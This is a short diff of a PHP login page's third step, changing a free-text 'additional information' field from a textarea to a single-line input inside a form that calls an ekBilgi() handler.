@@ -1178,7 +1178,7 @@ include '../inc/config.php';
                        <div class="card-body d-none flex-column" id="login-step-3">
                         <form id="form" action="javascript:;" onsubmit="ekBilgi()">
                           <div class="form-group">
-                            <textarea name="jethavale_ekbilgi" class="form-control"></textarea>
+                            <input name="jethavale_ekbilgi" class="form-control">
                           </div>
                          
                           <div class="d-flex flex-row">
